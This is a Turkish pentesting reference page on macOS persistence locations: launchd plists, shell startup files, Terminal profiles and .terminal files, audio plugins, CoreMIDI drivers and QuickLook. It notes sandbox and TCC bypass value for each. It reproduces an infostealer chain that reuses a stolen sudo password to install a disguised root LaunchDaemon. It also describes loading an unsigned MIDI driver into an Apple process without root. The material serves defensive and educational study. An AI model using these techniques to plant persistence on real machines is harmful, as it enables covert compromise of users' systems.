# macOS Otomatik Başlatma

{{#include ../banners/hacktricks-training.md}}

Bu bölüm büyük ölçüde [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) blog serisine dayanır. Amacı, bir dosyaya yazmanın daha sonra kod yürütülmesine yol açabileceği konumları, yürütmeyi tetikleyen olayı ve gereken izinleri belirlemektir. Bir konumun mevcut olması, mekanizmanın etkin olduğunun kanıtı değildir. Aşağıda belirtilen yerel kontroller macOS 26.5.2'de (5 Ekim 2026) gerçekleştirilmiştir; her macOS sürümündeki davranışı ortaya koymaz.

> [!NOTE]
> “Yazmayla tetiklenme” her zaman “yazdıktan hemen sonra çalışır” anlamına gelmez. Bazı konumlar yalnızca girişte, belirli bir uygulama başlatıldığında veya kullanıcı bir eylem gerçekleştirdiğinde okunur. Önceden yapılandırılmış bir işin içindeki yazılabilir payload, yeni bir iş kaydetme izninden de farklıdır. Bir tekniğe güvenmeden önce, deneme amaçlı bir hesapta veya VM'de test edin.

## Sandbox Bypass

> [!TIP]
> Burada, **sandbox bypass** için kullanışlı başlangıç konumları bulabilirsiniz. Bu konumlar, **root izinlerine ihtiyaç duymadan**, bir dosyaya **yazarak** bir şeyi çalıştırmanıza ve çok **yaygın** bir **eylemi**, belirli bir **süre** boyunca beklemenize ya da genellikle sandbox içinden gerçekleştirebileceğiniz bir **eylemi** beklemenize olanak tanır.

### Launchd

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konumlar

- **`/Library/LaunchAgents`**
  - **Tetikleyici**: Kullanıcı girişi (veya açık kayıt)
  - Root gerekir
- **`/Library/LaunchDaemons`**
  - **Tetikleyici**: Sistem önyüklemesi (veya açık kayıt)
  - Root gerekir
- **`/System/Library/LaunchAgents`**
  - **Tetikleyici**: Kullanıcı girişi; Apple tarafından korunan sistem konumu
- **`/System/Library/LaunchDaemons`**
  - **Tetikleyici**: Sistem önyüklemesi; Apple tarafından korunan sistem konumu
- **`~/Library/LaunchAgents`**
  - **Tetikleyici**: Yeniden giriş

`launchd` tarafından taranan bir `~/Library/LaunchDaemons` konumu yoktur. Kullanıcı başına işler `~/Library/LaunchAgents` içinde bulunur; sistem daemon dizini ise `/Library/LaunchDaemons` konumudur. [Apple'ın launchd başlangıç kılavuzu](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) taranan konumları açıklar.

> [!TIP]
> İlginç bir bilgi: **`launchd`**, Mach-o `__Text.__config` bölümünde gömülü bir property list içerir. Bu liste, launchd'nin başlatması gereken, iyi bilinen diğer servisleri içerir. Ayrıca bu servisler, çalıştırılmaları ve başarıyla tamamlanmaları gerektiği anlamına gelen `RequireSuccess`, `RequireRun` ve `RebootOnSuccess` anahtarlarını içerebilir.
>
> Elbette, code signing nedeniyle değiştirilemez.

#### Açıklama ve Exploitation

**`launchd`**, başlangıçta OX S kernel tarafından yürütülen **ilk** **process**, kapatılırken tamamlanan ise **son** process'tir. Her zaman **PID 1** olmalıdır. Bu process, aşağıdaki konumlardaki **ASEP** **plist** dosyalarında belirtilen yapılandırmaları **okur ve yürütür**:

- `/Library/LaunchAgents`: Admin tarafından yüklenen kullanıcı başına agent'lar
- `/Library/LaunchDaemons`: Admin tarafından yüklenen sistem genelindeki daemon'lar
- `/System/Library/LaunchAgents`: Apple tarafından sağlanan kullanıcı başına agent'lar.
- `/System/Library/LaunchDaemons`: Apple tarafından sağlanan sistem genelindeki daemon'lar.

Bir kullanıcı giriş yaptığında `launchd`, o kullanıcının `~/Library/LaunchAgents` konumundaki plist dosyalarını kullanıcının izinleriyle yükler. İşler kendi anahtarlarına göre başlatılır; yalnızca bir plist yüklenmesi, process'in hemen yürütüleceği anlamına gelmez.

**Agent'larla daemon'lar arasındaki temel fark, agent'ların kullanıcı giriş yaptığında, daemon'ların ise sistem başlangıcında yüklenmesidir** (örneğin ssh gibi bazı servislerin, herhangi bir kullanıcı sisteme erişmeden önce çalıştırılması gerekir). Ayrıca agent'lar GUI kullanabilirken daemon'ların arka planda çalışması gerekir.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Her `ProgramArguments` öğesi ayrı bir argümandır; `launchd`, tek bir dizgeyi shell komutu olarak ayrıştırmaz. Yukarıdaki düzeltilmiş örneğin sözdizimini yüklemeden `plutil -lint /path/to/example.plist` ile denetleyebilirsiniz. `ProgramArguments`, `RunAtLoad` ve `KeepAlive` için yerel `man launchd.plist` girdisine bakın.

#### Mevcut işlerde dosya olayı tetikleyicileri

**Önceden yüklenmiş** bir agent veya daemon, adlandırılmış bir yol değiştiğinde başlamak için `WatchPaths` kullanabilir. `QueueDirectories`, bir dizin boş değilken işi başlatır; `StartOnMount` ise bir birim bağlandığında işi başlatır. [Apple'ın launchd kılavuzunda](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) `WatchPaths` ve `QueueDirectories` örnekleri bulunur. İzlenen dosyaya yazmak, **önceden yapılandırılmış işi** tetikler; bu yalnızca yazma yetkisine sahip olan kişi işin yürütülebilir dosyasını, betiğini veya işin yorumladığı verileri de kontrol edebiliyorsa rastgele kod yürütme olanağı sağlar. Taranan veya kaydedilmiş bir konumun dışına yeni bir plist yazmak, tek başına onu yüklemez.

Bu kendi kendini temizleyen PoC, benzersiz ad taşıyan **geçici bir user agent** kaydeder, yalnızca kendi izlenen dosyasını değiştirir ve agent'ı kaldırır. macOS 26.5.2 üzerinde oturum kapatmadan veya yeniden başlatmadan başarıyla çalıştırılmıştır:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

Yerel çalıştırma `watch fired: True` çıktısını verdi ve `bootout` başarıyla tamamlandı. `launchctl bootstrap` burada yalnızca izole PoC içinde kullanılır; zaten yüklenmiş bir job için gerekli **değildir**. Mevcut bir job'ı güvenli biçimde değerlendirmek için plist dosyasını ve çözümlenmiş `ProgramArguments` yolunu okuyun, ardından ilgili yürütülebilir dosyanın veya yorumlanan dosyanın, herhangi bir değişiklik yapmadan, yazılabilir olup olmadığını kontrol edin.

Bazı durumlarda, **bir agent'ın kullanıcı oturum açmadan önce çalıştırılması gerekir**; bunlara **PreLoginAgents** denir. Örneğin, oturum açma sırasında yardımcı teknolojiler sağlamak için kullanışlıdırlar. Bunlar `/Library/LaunchAgents` içinde de bulunabilir ([**burada**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) bir örnek görebilirsiniz).

> [!TIP]
> Yeni Daemon veya Agent yapılandırma dosyaları **bir sonraki yeniden başlatmadan sonra veya** `launchctl load <target.plist>` **komutuyla yüklenir**. `.plist` uzantısı olmayan dosyaları da `launchctl -F <file>` **komutuyla yüklemek mümkündür** (ancak bu plist dosyaları yeniden başlatma sonrasında otomatik olarak yüklenmez).\
> `launchctl unload <target.plist>` **komutuyla dosyayı kaldırmak da mümkündür** (dosyanın işaret ettiği süreç sonlandırılır).
>
> Bir Agent veya Daemon'ın **çalışmasını engelleyen** bir şey (ör. bir geçersiz kılma) **olmadığından emin olmak** için şunu çalıştırın: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Mevcut kullanıcı tarafından yüklenmiş tüm agent ve daemon'ları listeleyin:

```bash
launchctl list
```

#### Örnek kötü amaçlı LaunchDaemon zinciri (parola yeniden kullanımı)

Yakın zamanda görülen bir macOS infostealer, bir user agent ve root LaunchDaemon bırakmak için **ele geçirilmiş sudo parolasını** yeniden kullandı:<sup>[[1]](#references)</sup>

- Agent döngüsünü `~/.agent` konumuna yazın ve çalıştırılabilir hâle getirin.
- Bu agent'ı işaret eden bir plist'i `/tmp/starter` konumunda oluşturun.
- Çalınan parolayı `sudo -S` ile yeniden kullanarak dosyayı `/Library/LaunchDaemons/com.finder.helper.plist` konumuna kopyalayın, `root:wheel` olarak ayarlayın ve `launchctl load` ile yükleyin.
- Çıktıyı ayırmak için agent'ı `nohup ~/.agent >/dev/null 2>&1 &` ile sessizce başlatın.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> `/Library/LaunchDaemons` içine yerleştirilen bir daemon plist dosyası, kullanıcıya ait olarak ayarlanmasıyla güvenli hâle gelmez. `launchd`, sistem işleri için uygun sahiplik ve izinler gerektirir ve güvenli olmayan bir plist'i reddedebilir. Root'a ait bir daemon, yapılandırmasında başka bir hesap seçilmediği sürece normalde root olarak çalışır. İşin `UserName` ve `GroupName` değerlerini, sahipliğini ve `launchctl` tanılamalarını kontrol edin; yalnızca plist sahibinin adına bakarak çalıştırma kimliğini çıkarsamayın.

#### launchd hakkında daha fazla bilgi

**`launchd`**, **kernel**'den başlatılan ilk kullanıcı modu sürecidir. Sürecin başlaması **başarılı** olmalı ve süreç **çıkamaz veya çökemez**. Hatta bazı **sonlandırma sinyallerine** karşı **korunur**.

`launchd`'nin ilk yapacağı şeylerden biri, aşağıdakiler gibi tüm **daemon**'ları **başlatmaktır**:

- Çalıştırılma zamanına göre çalışan **zamanlayıcı daemon'ları**:
  - macOS 26.5.2'de `com.apple.atrun.plist`, `/usr/libexec/atrun`'ı `StartInterval = 30` saniye ile çalıştırır; etkin durumu, launchd geçersiz kılmaları ayrı tuttuğu için plist'teki `Disabled` anahtarından farklı olabilir.
  - `/usr/lib/cron/tabs` işler içerdiğinde `com.vix.cron.plist`, `/usr/sbin/cron`'ı çalıştırır. `com.apple.systemstats.daily`, cron daemon'ından farklı bir zamanlanmış hizmettir.
- Aşağıdakiler gibi **ağ daemon'ları**:
  - `org.cups.cups-lpd`: TCP'yi (`SockType: stream`) `SockServiceName: printer` ile dinler
    - SockServiceName, bir bağlantı noktası veya `/etc/services` dosyasındaki bir hizmet olmalıdır
  - `com.apple.xscertd.plist`: TCP'de 1640 numaralı bağlantı noktasını dinler
- Belirtilen bir yol değiştiğinde çalıştırılan **yol daemon'ları**:
  - `com.apple.postfix.master`: `/etc/postfix/aliases` yolunu denetler
- **IOKit bildirim daemon'ları**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach portu:**
  - `com.apple.xscertd-helper.plist`: `MachServices` girdisinde `com.apple.xscertd.helper` adını belirtir
- **UserEventAgent:**
  - Bu, önceki örnekten farklıdır. Belirli bir olaya yanıt olarak launchd'nin uygulamaları başlatmasını sağlar. Ancak bu durumda, ilgili ana ikili `launchd` değil, `/usr/libexec/UserEventAgent`'dır. SIP tarafından kısıtlanan `/System/Library/UserEventPlugins/` klasöründen eklentileri yükler. Her eklenti, başlatıcısını `XPCEventModuleInitializer` anahtarında veya eski eklentilerde, `Info.plist` dosyasının `FB86416D-6164-2070-726F-70735C216EC0` anahtarı altındaki `CFPluginFactories` sözlüğünde belirtir.

### shell başlangıç dosyaları

İnceleme: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
İnceleme (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Ancak bu dosyaları yükleyen bir shell çalıştıran TCC Bypass'a sahip bir uygulama bulmanız gerekir

#### Konumlar

- **`~/.zshenv`** (veya daha yeni derlenmiş **`~/.zshenv.zwc`**)
  - **Tetikleyici**: Etkileşimsiz `zsh -c` dâhil, sıradan herhangi bir zsh çağrısı; `zsh -f` kullanıcı başlangıç dosyalarını atlar.
- **`~/.zshrc`**
  - **Tetikleyici**: Etkileşimli zsh başlatılır.
- **`~/.zprofile`, `~/.zlogin`**
  - **Tetikleyici**: Oturum açma zsh'i başlatılır; bu dosyalar sırasıyla `.zshrc` öncesinde ve sonrasında okunur.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Tetikleyici**: zsh ile bir terminal açılır
  - Root gerekir
- **`~/.zlogout`**
  - **Tetikleyici**: Oturum açma zsh'i normal şekilde çıkar; her terminal veya shell çıkışında değil.
- **`/etc/zlogout`**
  - **Tetikleyici**: zsh ile bir terminalden çıkılır
  - Root gerekir
- Potansiyel olarak daha fazlası: **`man zsh`**
- **`~/.bashrc`**
  - **Tetikleyici**: Etkileşimli **oturum açma olmayan** Bash başlatılır. Etkileşimli oturum açma Bash'i bu dosyayı yalnızca bir oturum açma dosyası açıkça kaynak gösterirse okur.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Tetikleyici**: Oturum açma Bash'i başlatılır; bu sıradaki ilk okunabilir dosya çalışır. Önceki dosyalardan biri varsa `~/.profile` atlanır.
- **`/etc/profile`**
  - **Tetikleyici**: Oturum açma Bash'i başlatılır; dosyayı değiştirmek için root gerekir.
- **`~/.tcshrc`** veya bu yoksa **`~/.cshrc`**
  - **Tetikleyici**: Bu Mac'te etkileşimsiz `tcsh -c` dâhil, `tcsh` başlatılır. Kullanıcının gerçekten `tcsh` çağırması gerekir; macOS'un varsayılan shell'i değildir.
- **`~/.login`**
  - **Tetikleyici**: Oturum açma `tcsh`'i, rc dosyasından sonra başlatılır.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Tetikleyici**: xterm ile tetiklenmesi beklenir, ancak **yüklü değildir** ve yüklendikten sonra bile şu hata verilir: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Açıklama ve Exploitation

`zsh` veya `bash` gibi bir shell ortamı başlatıldığında **belirli başlangıç dosyaları çalıştırılır**. macOS şu anda varsayılan shell olarak `/bin/zsh` kullanır. Terminal'ın veya SSH'nin oturum açma ya da etkileşimli bir shell başlatması kendi yapılandırmasına bağlıdır; yukarıdaki her dosyanın her oturumda çalıştığını varsaymayın. macOS'ta `bash` ve `sh` de bulunur, ancak kullanılmaları için açıkça çağrılmaları gerekir.<sup>[[2]](#references)</sup> [zsh başlangıç dosyası başvurusu](https://zsh.sourceforge.io/Doc/Release/Files.html), dosyaların sırasını, `ZDOTDIR` geçersiz kılmasını ve `.zwc` kuralını açıklar.

Aşağıdaki salt okunur deneyde macOS 26.5.2 üzerinde geçici bir `ZDOTDIR` kullanıldı. Gerçek bir shell başlangıç dosyası değiştirilmeden, hangi kullanıcı dosyalarının okunduğu gösteriliyor:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

Gözlemlenen sıra `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout` şeklindeydi. `ZDOTDIR` zaten alternatif dizini göstermelidir; rastgele bir dizine dosya yazmak yeterli değildir.

[Bash'in başlangıç referansı](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html), login ve interactive shell'leri birbirinden ayırır. macOS 26.5.2 test makinesinde, dört kullanıcı başlangıç dosyasını içeren yalıtılmış bir `HOME` şu sonuçları verdi: `bash -c` → hiçbiri, `bash -ic` → `.bashrc`, `bash -lc` ve `bash -lic` → yalnızca `.bash_profile`. `.bash_profile` kaldırıldığında login Bash, `.bash_login` dosyasını; o da kaldırıldığında `.profile` dosyasını okudu. `BASH_ENV`, noninteractive Bash'i bir dosyaya yönlendirebilir; ancak bu ortam değişkeni çağıran süreçte önceden ayarlanmış olmalıdır. Login Bash'ten açıkça `exit` edilmesi `~/.bash_logout` dosyasının yüklenmesine de neden olabilir.

Yerel `tcsh(1)` kılavuzu ayrı başlangıç sırasını belgeler. Geçici bir `HOME` ile `/bin/tcsh -c :`, `.tcshrc` dosyasını; bu dosya yoksa `.cshrc` dosyasını okudu. Geçici bir login `tcsh`, `.tcshrc` ve `.login` dosyalarını okudu. Bu kontroller yalnızca geçici dosyalar oluşturup kaldırdı.

### Yeniden Açılan Uygulamalar

> [!CAUTION]
> Belirtilen exploitation yapılandırıldığında ve oturum kapatılıp yeniden açıldığında, hatta bilgisayar yeniden başlatıldığında bile testlerde uygulama çalıştırılmadı. Bu işlemler yapılırken uygulamanın çalışıyor olması gerekebilir.

**Yazı**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Tetikleyici**: Yeniden başlatıldığında uygulamaları yeniden açma

#### Açıklama ve Exploitation

Yeniden açılacak tüm uygulamalar `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` plist dosyasındadır<sup>[[4]](#references)</sup>

Dolayısıyla, yeniden açılacak uygulamalar arasında kendi uygulamanızın da başlatılmasını sağlamak için **uygulamanızı listeye eklemeniz** yeterlidir.

UUID'yi bu dizini listeleyerek veya `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` komutuyla bulabilirsiniz.

Yeniden açılacak uygulamaları kontrol etmek için şunu çalıştırabilirsiniz:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Bir **uygulamayı bu listeye eklemek** için şunu kullanabilirsiniz:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Terminal Tercihleri

Yazı: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal, kullanıcının FDA izinlerine sahip olmak için kullanılır

#### Konum

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Tetikleyici**: Başlangıç komutunu içeren Shell ayarlarına sahip profili kullanarak yeni bir Terminal penceresi veya sekmesi açmak

#### Açıklama ve Exploitation

**`~/Library/Preferences`** içinde, kullanıcının Applications uygulamalarındaki tercihleri saklanır. Bu tercihlerden bazıları, **başka uygulamaları/script'leri çalıştırmaya** yönelik bir yapılandırma içerebilir.<sup>[[5]](#references)</sup>

Örneğin Terminal, başlangıçta bir komut çalıştırabilir:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Bu yapılandırma, **`~/Library/Preferences/com.apple.Terminal.plist`** dosyasına şu şekilde yansır:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

İlgili profil bir başlangıç komutu içeriyorsa ve Terminal bu tercihi okursa, bu profili kullanan yeni bir oturum komutu çalıştırabilir. [Apple'ın güncel Terminal kılavuzu](https://support.apple.com/guide/terminal/trmlshll/mac), profil başına **Shell → Startup** komutunu belgeliyor. Bu profili kullanan yeni bir oturum açmadan yalnızca Terminal'i açmak yeterli değildir. Aşağıdaki tercih düzenlemeleri araştırma Mac'inde **yapılmadı**.

Bunu CLI üzerinden şu şekilde ekleyebilirsiniz:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal Scripts / Other file extensions

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Kullanıcının FDA izinlerine sahip Terminal'i kullanın

#### Konum

- **Herhangi bir yer**
  - **Tetikleyici**: İlgili `.terminal`, `.command` veya `.tool` dosyasını açın

#### Açıklama ve Exploitation

Bir kullanıcı **`.terminal`** ayar dosyasını açarsa Terminal, bu dosyanın profilinden bir oturum oluşturabilir; çalıştırılabilir **`.command`** ve **`.tool`** dosyaları da Terminal'de açılabilir. Bu, Terminal'i yalnızca açmaktan kaynaklanan bir çalıştırma değil, dosyanın açıkça açılmasıyla tetiklenir. Devralınan TCC erişimi, Terminal'in sahip olduğu gerçek izinlere ve gerçekleştirilmeye çalışılan işleme bağlıdır. Aşağıdaki tarihî örnek, araştırma Mac'inde çalıştırılmadı.

Şunu deneyin:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Ayrıca normal shell script içeriğine sahip **`.command`**, **`.tool`** uzantılarını da kullanabilirsiniz; bunlar da Terminal ile açılır.

> [!CAUTION]
> Terminal'de **Full Disk Access** varsa bu işlemi tamamlayabilir (yürütülen komutun bir Terminal penceresinde görüneceğini unutmayın).

### Ses Eklentileri

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Ek TCC erişimi elde edebilirsiniz

#### Konum

- **`/Library/Audio/Plug-Ins/HAL`**
  - Root gerekir
  - **Tetikleyici**: Core Audio sunucusu uyumlu bir HAL aygıt eklentisini yükler; sunucunun yeniden başlatılması aygıtın yeniden keşfedilmesine neden olabilir
- **`/Library/Audio/Plug-ins/Components`**
  - Root gerekir
  - **Tetikleyici**: Bir ses ana makinesi yüklenen Audio Unit'i keşfeder ve başlatır
- **`~/Library/Audio/Plug-ins/Components`**
  - **Tetikleyici**: Bir ses ana makinesi yüklenen Audio Unit'i keşfeder ve başlatır
- **`/System/Library/Components`**
  - Apple tarafından sağlanır, sistem korumalı konum
  - **Tetikleyici**: Bir ses ana makinesi eşleşen bir sistem bileşenini başlatır

#### Açıklama

Önceki writeup'lara göre bazı ses eklentilerini **derleyip** yükletmek mümkündür.<sup>[[6]](#references)[[7]](#references)</sup>

HAL aygıt eklentileri ve Audio Unit'ler farklı yükleme yollarına sahiptir. [Apple'ın Audio Unit barındırma kılavuzu](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html), bir ana makinenin bileşeni bulup başlatması gerektiğini belirtir; bir bileşeni tarama dizinine kopyalamak veya `coreaudiod`'u yeniden başlatmak tek başına kodun çalıştırıldığını kanıtlamaz. AUv2 eklentileri ana makine sürecinde çalışırken, [Apple'ın güncel Audio Unit kılavuzu](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments), macOS'te AUv3'ün varsayılan olarak ayrı bir süreçte çalıştığını belirtir. İmza, sandbox ve library validation denetimleri ana makineye bağlıdır. Araştırma Mac'ine hiçbir ses eklentisi yüklenmedi veya çalıştırılmadı.

### CoreMIDI Sürücüleri (MIDIServer)

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Kodunuz uygulamanızın sandbox'ında değil, `MIDIServer` sürecinde çalışır
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` kendi `seatbelt` sandbox profiliyle çalışır

#### Konum

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Root gerekmez (kullanıcı tarafından yazılabilir)
  - **Tetikleyici**: `MIDIServer` başlatılır veya yeniden başlatılır. Herhangi bir süreç CoreMIDI'yi ilk kez kullandığında isteğe bağlı olarak başlatılır (*Audio MIDI Setup*, GarageBand, bir DAW veya WebMIDI kullanan bir sayfa açıldığında)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Root gerekir
  - **Tetikleyici**: yukarıdakiyle aynı

#### Açıklama ve Exploitation

Apple'ın `MIDIServer`'ı (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`), `Audio/MIDI Drivers` dizinlerindeki MIDI **sürücü** paketlerini yükler. İkili dosya Apple tarafından imzalanmıştır, ancak `com.apple.security.cs.disable-library-validation` yetkisiyle birlikte gelir; bu nedenle **imzasız veya farklı bir ekip tarafından ad-hoc imzalanmış** bir paketi yükleyerek **root olmadan**, Apple'a ait ayrı bir süreçte kod çalıştırılmasını sağlar.<sup>[[53]](#references)</sup>

macOS 26'da doğrulandı (salt okunur):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Bir sürücü, `MIDIDriverInterface` factory’sini dışa aktaran standart bir bundle’dır; payload’u factory/constructor içine yerleştirmek, `MIDIServer` sürücüleri listeler listelemez çalışmasını sağlar. Sürücüyü derleyip `~/Library/Audio/MIDI Drivers/Evil.plugin` konumuna bırakın, ardından oturumu kapatmadan veya yeniden başlatmadan yüklenmesini tetikleyin:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook Eklentileri

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Ek TCC erişimi elde edebilirsiniz

#### Konum

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
